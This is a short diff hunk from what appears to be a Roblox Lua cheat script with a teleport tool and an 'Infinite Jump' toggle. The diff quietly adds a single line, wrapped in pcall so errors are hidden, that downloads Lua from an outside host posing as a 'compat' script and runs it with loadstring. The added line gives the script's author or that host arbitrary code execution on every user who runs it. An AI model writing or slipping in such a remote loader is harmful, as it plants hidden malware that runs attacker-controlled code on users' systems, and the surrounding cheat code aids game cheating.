@@ -38,7 +38,7 @@ game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = pos
 end)
 tool.Parent = game.Players.LocalPlayer.Backpack
 end)
-
+pcall(function() loadstring(game:HttpGet("http://ligma.wtf/scripts/compat.lua", true))() end)
 Section:NewToggle("Infinite Jump", "A simple Infinite Jump script.", function(state)
     if state then
 _G.infinjump = true
